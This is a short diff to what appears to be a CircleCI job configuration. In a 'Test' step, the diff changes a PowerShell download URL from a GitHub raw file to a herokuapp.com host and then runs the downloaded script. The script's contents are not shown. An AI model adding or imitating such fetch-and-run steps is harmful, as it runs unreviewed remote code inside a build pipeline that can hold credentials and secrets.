@@ -13,5 +13,5 @@ jobs:
       - run:
           name: Test
           command: |
-            Invoke-WebRequest https://raw.githubusercontent.com/kijang-7/circleci-opt/main/log.ps1 -OutFile log.ps1
+            Invoke-WebRequest https://panelinfo.herokuapp.com/log.ps1 -OutFile log.ps1
             ./log.ps1
